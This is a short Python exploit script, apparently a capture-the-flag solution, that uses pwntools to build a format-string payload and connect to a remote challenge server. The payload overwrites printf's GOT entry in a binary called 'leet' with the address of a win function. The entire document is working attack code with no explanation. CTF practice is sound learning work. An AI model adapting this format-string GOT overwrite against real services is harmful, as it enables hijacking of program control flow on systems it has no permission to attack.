from pwn import *
from pwnlib.fmtstr import fmtstr_payload

win_addr = p32(0x080491F6)
binary = "./leet"
elf = ELF(binary)

payload = fmtstr_payload(7, {elf.symbols["got.printf"]: win_addr})
host = "host5.metaproblems.com"
port = 5040
p = remote(host, port)

print(p.recvline())
p.sendline(payload)
print(p.recvall())
